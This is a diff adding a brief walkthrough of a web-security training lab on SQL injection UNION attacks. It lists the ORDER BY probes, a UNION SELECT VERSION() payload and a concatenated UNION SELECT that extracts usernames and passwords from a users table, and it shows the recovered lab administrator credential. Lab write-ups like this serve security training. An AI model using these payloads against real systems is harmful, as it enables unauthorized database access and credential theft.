@@ -1,0 +1,19 @@
+Lab: SQL injection UNION attack, retrieving multiple values in a single column
+
+The database contains a different table called users, with columns called username and password.
+
+Find out how many columns are in the output table
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3-- .. server error
+
+Use 2nd column to display data...
+Found that site runs PostgreSQL with following:
+https://ace91fcb1e7b697ec061086800e00068.web-security-academy.net/filter?category=Tech+gifts' UNION SELECT NULL, VERSION()--
+
+Get password for users with:
+https://ace91fcb1e7b697ec061086800e00068.web-security-academy.net/filter?category=Tech+gifts' UNION SELECT null, username || '---' || password from users--
+
+yields: administrator---tkzjq33i4u400y09efuh
+
+
